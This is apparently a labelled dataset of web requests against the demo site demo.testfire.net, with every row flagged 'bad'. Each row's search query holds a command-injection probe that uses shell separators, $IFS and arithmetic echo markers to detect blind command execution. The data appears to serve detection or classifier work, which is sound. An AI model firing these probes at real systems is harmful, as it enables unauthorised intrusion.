path,content,host,class_flag
"/search.jsp?query=&&echo$IFSCAAYWG$((20+2))$(echo$IFSCAAYWG)CAAYWG""",,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSMWSWXL$((58+55))$(echo$IFSMWSWXL)MWSWXL""",,demo.testfire.net,['bad']
"/search.jsp?query=;echo$IFSEXIZMZ$((4+42))$(echo$IFSEXIZMZ)EXIZMZ""",,demo.testfire.net,['bad']
"/search.jsp?query=&echo$IFSCVYZVT$((26+52))$(echo$IFSCVYZVT)CVYZVT""",,demo.testfire.net,['bad']
"/search.jsp?query=&&echo$IFSPFGYCN$((54+71))$(echo$IFSPFGYCN)PFGYCN""",,demo.testfire.net,['bad']
"/search.jsp?query=|echo$IFSBKTNUH$((60+31))$(echo$IFSBKTNUH)BKTNUH""",,demo.testfire.net,['bad']
"/search.jsp?query=||echo$IFSCBQMAD$((2+96))$(echo$IFSCBQMAD)CBQMAD""",,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSKVWOUC$((99+55))$(echo$IFSKVWOUC)KVWOUC\\,,demo.testfire.net,['bad']
/search.jsp?query= echo RSFFRY$((9+19))$(echo RSFFRY)RSFFRY\\,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSNCMFZS$((89+41))$(echo$IFSNCMFZS)NCMFZS\\,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSBMZKTX$((63+94))$(echo$IFSBMZKTX)BMZKTX\\,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSXACUZH$((38+20))$(echo$IFSXACUZH)XACUZH\\,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSCDNNJT$((44+92))$(echo$IFSCDNNJT)CDNNJT\\,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSQGZOTF$((32+38))$(echo$IFSQGZOTF)QGZOTF\\,,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSVXNZFI$((43+77))$(echo$IFSVXNZFI)VXNZFI\\",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSKUUKMT$((50+2))$(echo$IFSKUUKMT)KUUKMT\\,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSUNNWEF$((23+41))$(echo$IFSUNNWEF)UNNWEF\\,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSBTZBFI$((26+9))$(echo$IFSBTZBFI)BTZBFI\\,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSUXKUGT$((68+89))$(echo$IFSUXKUGT)UXKUGT\\,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSCPXZIZ$((42+75))$(echo$IFSCPXZIZ)CPXZIZ\\,,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSNEIUQG$((81+27))$(echo$IFSNEIUQG)NEIUQG//,,demo.testfire.net,['bad']
/search.jsp?query= echo AGJORR$((30+64))$(echo AGJORR)AGJORR//,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSZFBJPC$((94+13))$(echo$IFSZFBJPC)ZFBJPC//,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSBALCSS$((45+32))$(echo$IFSBALCSS)BALCSS//,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSRLIAHI$((26+64))$(echo$IFSRLIAHI)RLIAHI//,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSFYOTZG$((27+28))$(echo$IFSFYOTZG)FYOTZG//,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSEQAZRH$((48+41))$(echo$IFSEQAZRH)EQAZRH//,,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSGOFGQM$((48+74))$(echo$IFSGOFGQM)GOFGQM//,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSNHIGJT$((60+13))$(echo$IFSNHIGJT)NHIGJT//,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSXIMJKY$((88+60))$(echo$IFSXIMJKY)XIMJKY//,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSOLIGWD$((87+60))$(echo$IFSOLIGWD)OLIGWD//,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSWFKQVE$((90+1))$(echo$IFSWFKQVE)WFKQVE//,,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSKILZJB$((46+73))$(echo$IFSKILZJB)KILZJB&,,demo.testfire.net,['bad']
/search.jsp?query= echo QZXLFH$((87+1))$(echo QZXLFH)QZXLFH&,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSKNVVGI$((69+44))$(echo$IFSKNVVGI)KNVVGI&,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSGGNKZG$((61+42))$(echo$IFSGGNKZG)GGNKZG&,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSOOHCGM$((30+35))$(echo$IFSOOHCGM)OOHCGM&,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSUUHQZJ$((20+57))$(echo$IFSUUHQZJ)UUHQZJ&,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSZBRXDH$((79+80))$(echo$IFSZBRXDH)ZBRXDH&,,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSYUKKNH$((56+49))$(echo$IFSYUKKNH)YUKKNH&",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSVCXHRJ$((81+64))$(echo$IFSVCXHRJ)VCXHRJ&,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSQKYNMI$((45+66))$(echo$IFSQKYNMI)QKYNMI&,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSQSKLWT$((87+73))$(echo$IFSQSKLWT)QSKLWT&,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSZBEWBO$((6+42))$(echo$IFSZBEWBO)ZBEWBO&,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSDNZMGO$((37+14))$(echo$IFSDNZMGO)DNZMGO&,,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSAGOPUQ$((42+10))$(echo$IFSAGOPUQ)AGOPUQ|,,demo.testfire.net,['bad']
/search.jsp?query= echo OWFQEK$((68+50))$(echo OWFQEK)OWFQEK|,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSKGPTGS$((5+86))$(echo$IFSKGPTGS)KGPTGS|,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSSTSBFI$((8+30))$(echo$IFSSTSBFI)STSBFI|,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSCETCMO$((72+54))$(echo$IFSCETCMO)CETCMO|,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSGUUNMQ$((78+22))$(echo$IFSGUUNMQ)GUUNMQ|,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSSYDVAH$((5+92))$(echo$IFSSYDVAH)SYDVAH|,,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSEWPWSX$((63+88))$(echo$IFSEWPWSX)EWPWSX|",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSQXXUTJ$((23+47))$(echo$IFSQXXUTJ)QXXUTJ|,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSWWWJLY$((48+38))$(echo$IFSWWWJLY)WWWJLY|,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSAOUDEZ$((1+19))$(echo$IFSAOUDEZ)AOUDEZ|,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSRIYZJH$((86+76))$(echo$IFSRIYZJH)RIYZJH|,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSMCOPIM$((20+16))$(echo$IFSMCOPIM)MCOPIM|,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSFGJBHF$((15+32))$(echo$IFSFGJBHF)FGJBHF,,demo.testfire.net,['bad']
/search.jsp?query=& echo TIBIEC$((4+66))$(echo TIBIEC)TIBIEC,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSRHWTNA$((89+71))$(echo$IFSRHWTNA)RHWTNA,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSMIRTWY$((62+53))$(echo$IFSMIRTWY)MIRTWY,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSKZQOKA$((45+18))$(echo$IFSKZQOKA)KZQOKA,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSKDFDHF$((15+62))$(echo$IFSKDFDHF)KDFDHF,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSARASQY$((54+7))$(echo$IFSARASQY)ARASQY,,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSIDFVQL$((32+50))$(echo$IFSIDFVQL)IDFVQL",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSTREOSX$((82+26))$(echo$IFSTREOSX)TREOSX,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSKNRSWF$((61+96))$(echo$IFSKNRSWF)KNRSWF,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSKLSCLG$((90+83))$(echo$IFSKLSCLG)KLSCLG,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSSWFONC$((23+88))$(echo$IFSSWFONC)SWFONC,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSPNPVKS$((7+36))$(echo$IFSPNPVKS)PNPVKS,,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSMFYMXE$((53+41))$(echo$IFSMFYMXE)MFYMXE',,demo.testfire.net,['bad']
/search.jsp?query= echo ZEKBWJ$((52+55))$(echo ZEKBWJ)ZEKBWJ',,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSHVLOAR$((38+86))$(echo$IFSHVLOAR)HVLOAR',,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSGQPCYE$((3+64))$(echo$IFSGQPCYE)GQPCYE',,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSIYVBZD$((59+23))$(echo$IFSIYVBZD)IYVBZD',,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSKGDWNL$((30+97))$(echo$IFSKGDWNL)KGDWNL',,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSOVPFJY$((4+71))$(echo$IFSOVPFJY)OVPFJY',,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSTYZEHS$((92+83))$(echo$IFSTYZEHS)TYZEHS'",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSXKGKWO$((82+28))$(echo$IFSXKGKWO)XKGKWO',,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSCTPDWS$((75+8))$(echo$IFSCTPDWS)CTPDWS',,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSHRVANY$((38+49))$(echo$IFSHRVANY)HRVANY',,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSSBTHEA$((52+44))$(echo$IFSSBTHEA)SBTHEA',,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSRGNFOX$((20+17))$(echo$IFSRGNFOX)RGNFOX',,demo.testfire.net,['bad']
"/search.jsp?query=echo$IFSCWQJJR$((12+68))$(echo$IFSCWQJJR)CWQJJR""",,demo.testfire.net,['bad']
"/search.jsp?query= echo WJGLHQ$((32+43))$(echo WJGLHQ)WJGLHQ""",,demo.testfire.net,['bad']
"/search.jsp?query=;echo$IFSWYKTNX$((57+37))$(echo$IFSWYKTNX)WYKTNX""",,demo.testfire.net,['bad']
"/search.jsp?query=&echo$IFSJZGSQS$((35+79))$(echo$IFSJZGSQS)JZGSQS""",,demo.testfire.net,['bad']
"/search.jsp?query=|echo$IFSQFRZWC$((58+49))$(echo$IFSQFRZWC)QFRZWC""",,demo.testfire.net,['bad']
"/search.jsp?query=||echo$IFSUEGFHX$((37+52))$(echo$IFSUEGFHX)UEGFHX""",,demo.testfire.net,['bad']
"/search.jsp?query=&&echo$IFSWMOQUS$((33+35))$(echo$IFSWMOQUS)WMOQUS""",,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSRVNRNT$((25+8))$(echo$IFSRVNRNT)RVNRNT""",,demo.testfire.net,['bad']
"/search.jsp?query=;echo$IFSFGMEVK$((82+64))$(echo$IFSFGMEVK)FGMEVK""",,demo.testfire.net,['bad']
"/search.jsp?query=&echo$IFSKWKDEB$((37+89))$(echo$IFSKWKDEB)KWKDEB""",,demo.testfire.net,['bad']
"/search.jsp?query=&&echo$IFSPCPZYO$((56+87))$(echo$IFSPCPZYO)PCPZYO""",,demo.testfire.net,['bad']
"/search.jsp?query=|echo$IFSATHGRY$((94+45))$(echo$IFSATHGRY)ATHGRY""",,demo.testfire.net,['bad']
"/search.jsp?query=||echo$IFSPLQDHT$((81+8))$(echo$IFSPLQDHT)PLQDHT""",,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSUYTATZ$((65+69))$(echo$IFSUYTATZ)UYTATZ,,demo.testfire.net,['bad']
/search.jsp?query= echo DWUNAS$((73+45))$(echo DWUNAS)DWUNAS,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSDYVMJQ$((81+59))$(echo$IFSDYVMJQ)DYVMJQ,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSSFXMFL$((26+3))$(echo$IFSSFXMFL)SFXMFL,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSTPUAPH$((74+20))$(echo$IFSTPUAPH)TPUAPH,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSETWMKB$((45+66))$(echo$IFSETWMKB)ETWMKB,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSJQGTZT$((74+60))$(echo$IFSJQGTZT)JQGTZT,,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSEMHHKB$((6+28))$(echo$IFSEMHHKB)EMHHKB",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSMQUPHW$((66+11))$(echo$IFSMQUPHW)MQUPHW,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSYETOFB$((93+7))$(echo$IFSYETOFB)YETOFB,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSCRVQIY$((43+55))$(echo$IFSCRVQIY)CRVQIY,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSQKTYDP$((13+93))$(echo$IFSQKTYDP)QKTYDP,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSHIOXYU$((5+45))$(echo$IFSHIOXYU)HIOXYU,,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSONQRPJ$((44+25))$(echo$IFSONQRPJ)ONQRPJ//,,demo.testfire.net,['bad']
/search.jsp?query= echo IOTEZW$((83+52))$(echo IOTEZW)IOTEZW//,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSZIROGF$((6+49))$(echo$IFSZIROGF)ZIROGF//,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSEGQCCP$((72+31))$(echo$IFSEGQCCP)EGQCCP//,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSZGMESR$((73+1))$(echo$IFSZGMESR)ZGMESR//,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSDAJJOA$((63+6))$(echo$IFSDAJJOA)DAJJOA//,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSYSBJXS$((33+16))$(echo$IFSYSBJXS)YSBJXS//,,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSGAMIHF$((8+20))$(echo$IFSGAMIHF)GAMIHF//",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSGIAMLN$((3+33))$(echo$IFSGIAMLN)GIAMLN//,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSSAEWRK$((96+15))$(echo$IFSSAEWRK)SAEWRK//,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSLRENSC$((21+32))$(echo$IFSLRENSC)LRENSC//,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSSMHPXX$((60+18))$(echo$IFSSMHPXX)SMHPXX//,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSXSPEPB$((67+12))$(echo$IFSXSPEPB)XSPEPB//,,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSJMCTGN$((61+39))$(echo$IFSJMCTGN)JMCTGN\,,demo.testfire.net,['bad']
/search.jsp?query= echo YGXKOB$((39+6))$(echo YGXKOB)YGXKOB\,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSGPDOCC$((56+25))$(echo$IFSGPDOCC)GPDOCC\,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSJHJDBQ$((59+7))$(echo$IFSJHJDBQ)JHJDBQ\,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSPYNQQN$((22+41))$(echo$IFSPYNQQN)PYNQQN\,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSXEGABJ$((43+91))$(echo$IFSXEGABJ)XEGABJ\,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSKQEDXL$((91+84))$(echo$IFSKQEDXL)KQEDXL\,,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSVXZGNO$((12+40))$(echo$IFSVXZGNO)VXZGNO\",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSPSOQAR$((79+87))$(echo$IFSPSOQAR)PSOQAR\,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSRNOWIN$((9+87))$(echo$IFSRNOWIN)RNOWIN\,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSDKXDPB$((45+44))$(echo$IFSDKXDPB)DKXDPB\,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSAQWEET$((38+66))$(echo$IFSAQWEET)AQWEET\,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSXRRNLV$((42+73))$(echo$IFSXRRNLV)XRRNLV\,,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSWAXZNH$((13+26))$(echo$IFSWAXZNH)WAXZNH&,,demo.testfire.net,['bad']
/search.jsp?query= echo FMKAYB$((43+18))$(echo FMKAYB)FMKAYB&,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSNFQTQE$((64+35))$(echo$IFSNFQTQE)NFQTQE&,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSGHAYMK$((85+70))$(echo$IFSGHAYMK)GHAYMK&,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSILKQLY$((38+92))$(echo$IFSILKQLY)ILKQLY&,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSJTVIEI$((59+6))$(echo$IFSJTVIEI)JTVIEI&,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSRUHGTD$((2+41))$(echo$IFSRUHGTD)RUHGTD&,,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSYBIRAD$((77+75))$(echo$IFSYBIRAD)YBIRAD&",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSNZACRG$((6+1))$(echo$IFSNZACRG)NZACRG&,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSOXDOPZ$((45+42))$(echo$IFSOXDOPZ)OXDOPZ&,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSMCBQMM$((11+98))$(echo$IFSMCBQMM)MCBQMM&,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSEJJUPB$((40+97))$(echo$IFSEJJUPB)EJJUPB&,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSCJGMRV$((68+61))$(echo$IFSCJGMRV)CJGMRV&,,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSAAZQPF$((47+0))$(echo$IFSAAZQPF)AAZQPF|,,demo.testfire.net,['bad']
/search.jsp?query= echo GWYMFM$((13+53))$(echo GWYMFM)GWYMFM|,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSHKIKWV$((20+23))$(echo$IFSHKIKWV)HKIKWV|,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSPTGUJI$((21+75))$(echo$IFSPTGUJI)PTGUJI|,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSESSSWT$((28+90))$(echo$IFSESSSWT)ESSSWT|,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSDEGINN$((57+72))$(echo$IFSDEGINN)DEGINN|,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSLXPMRF$((61+87))$(echo$IFSLXPMRF)LXPMRF|,,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSVPYEIG$((0+32))$(echo$IFSVPYEIG)VPYEIG|",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSBJQYNU$((71+12))$(echo$IFSBJQYNU)BJQYNU|,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSKZFTIO$((50+29))$(echo$IFSKZFTIO)KZFTIO|,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSZAYXMZ$((3+83))$(echo$IFSZAYXMZ)ZAYXMZ|,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSJWHQHE$((54+5))$(echo$IFSJWHQHE)JWHQHE|,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSHRKGCV$((26+87))$(echo$IFSHRKGCV)HRKGCV|,,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSBFVSUE$((14+45))$(echo$IFSBFVSUE)BFVSUE',,demo.testfire.net,['bad']
/search.jsp?query= echo IJYFHL$((62+88))$(echo IJYFHL)IJYFHL',,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSGLCFHE$((9+20))$(echo$IFSGLCFHE)GLCFHE',,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSBGJFMV$((55+92))$(echo$IFSBGJFMV)BGJFMV',,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSZFFAPM$((39+91))$(echo$IFSZFFAPM)ZFFAPM',,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSMWPSUX$((83+82))$(echo$IFSMWPSUX)MWPSUX',,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSUUESOS$((61+71))$(echo$IFSUUESOS)UUESOS',,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSLRBMQR$((4+80))$(echo$IFSLRBMQR)LRBMQR'",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSLWIDNI$((59+10))$(echo$IFSLWIDNI)LWIDNI',,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSEHCFWA$((81+0))$(echo$IFSEHCFWA)EHCFWA',,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSVEMRKI$((43+17))$(echo$IFSVEMRKI)VEMRKI',,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSAVHQSF$((54+86))$(echo$IFSAVHQSF)AVHQSF',,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSBUDOYZ$((31+53))$(echo$IFSBUDOYZ)BUDOYZ',,demo.testfire.net,['bad']
"/search.jsp?query=echo$IFSJEPZHW$((73+73))$(echo$IFSJEPZHW)JEPZHW""",,demo.testfire.net,['bad']
"/search.jsp?query= echo JMDNRV$((22+54))$(echo JMDNRV)JMDNRV""",,demo.testfire.net,['bad']
"/search.jsp?query=;echo$IFSPRIHYT$((43+53))$(echo$IFSPRIHYT)PRIHYT""",,demo.testfire.net,['bad']
"/search.jsp?query=&echo$IFSCMDMMG$((63+46))$(echo$IFSCMDMMG)CMDMMG""",,demo.testfire.net,['bad']
"/search.jsp?query=|echo$IFSGFJBIP$((75+97))$(echo$IFSGFJBIP)GFJBIP""",,demo.testfire.net,['bad']
"/search.jsp?query=||echo$IFSOXMDCJ$((76+31))$(echo$IFSOXMDCJ)OXMDCJ""",,demo.testfire.net,['bad']
"/search.jsp?query=&&echo$IFSLHVDJA$((34+71))$(echo$IFSLHVDJA)LHVDJA""",,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH""",,demo.testfire.net,['bad']
"/search.jsp?query=;echo$IFSOHDIIO$((86+73))$(echo$IFSOHDIIO)OHDIIO""",,demo.testfire.net,['bad']
"/search.jsp?query=&echo$IFSKOBRCD$((77+43))$(echo$IFSKOBRCD)KOBRCD""",,demo.testfire.net,['bad']
"/search.jsp?query=&&echo$IFSOWHNUL$((45+96))$(echo$IFSOWHNUL)OWHNUL""",,demo.testfire.net,['bad']
"/search.jsp?query=|echo$IFSCYXIRA$((56+74))$(echo$IFSCYXIRA)CYXIRA""",,demo.testfire.net,['bad']
"/search.jsp?query=||echo$IFSLSGARN$((66+92))$(echo$IFSLSGARN)LSGARN""",,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSBXVMDK$((6+31))$(echo$IFSBXVMDK)BXVMDK\\,,demo.testfire.net,['bad']
/search.jsp?query= echo LCFCBB$((47+22))$(echo LCFCBB)LCFCBB\\,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSHWOOOB$((33+98))$(echo$IFSHWOOOB)HWOOOB\\,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSPYIUYZ$((71+45))$(echo$IFSPYIUYZ)PYIUYZ\\,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSAMCJYH$((20+48))$(echo$IFSAMCJYH)AMCJYH\\,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSUCPPVT$((17+44))$(echo$IFSUCPPVT)UCPPVT\\,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSDFYDRA$((1+96))$(echo$IFSDFYDRA)DFYDRA\\,,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSODUPZQ$((21+13))$(echo$IFSODUPZQ)ODUPZQ\\",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSXJAFQU$((79+24))$(echo$IFSXJAFQU)XJAFQU\\,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSBWATKS$((45+68))$(echo$IFSBWATKS)BWATKS\\,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSKBVKTU$((41+2))$(echo$IFSKBVKTU)KBVKTU\\,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSIXAXIN$((24+47))$(echo$IFSIXAXIN)IXAXIN\\,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSXZTTAD$((21+98))$(echo$IFSXZTTAD)XZTTAD\\,,demo.testfire.net,['bad']
/search.jsp?query=echo$IFSYIGMIK$((93+31))$(echo$IFSYIGMIK)YIGMIK//,,demo.testfire.net,['bad']
/search.jsp?query= echo PIWJVB$((35+55))$(echo PIWJVB)PIWJVB//,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSCXFXGD$((63+87))$(echo$IFSCXFXGD)CXFXGD//,,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSAQHLIY$((38+77))$(echo$IFSAQHLIY)AQHLIY//,,demo.testfire.net,['bad']
/search.jsp?query=|echo$IFSUZPDRC$((26+91))$(echo$IFSUZPDRC)UZPDRC//,,demo.testfire.net,['bad']
/search.jsp?query=||echo$IFSAOIEWW$((12+22))$(echo$IFSAOIEWW)AOIEWW//,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSTRGLMB$((67+67))$(echo$IFSTRGLMB)TRGLMB//,,demo.testfire.net,['bad']
"/search.jsp?query=
echo$IFSTWDCWQ$((75+11))$(echo$IFSTWDCWQ)TWDCWQ//",,demo.testfire.net,['bad']
/search.jsp?query=;echo$IFSCAANPZ$((68+82))$(echo$IFSCAANPZ)CAANPZ//,,demo.testfire.net,['bad']
/search.jsp?query=&echo$IFSVUHFEV$((97+15))$(echo$IFSVUHFEV)VUHFEV//,,demo.testfire.net,['bad']
/search.jsp?query=&&echo$IFSCFKMSQ$((61+81))$(echo$IFSCFKMSQ)CFKMSQ//,,demo.testfire.net,['bad']
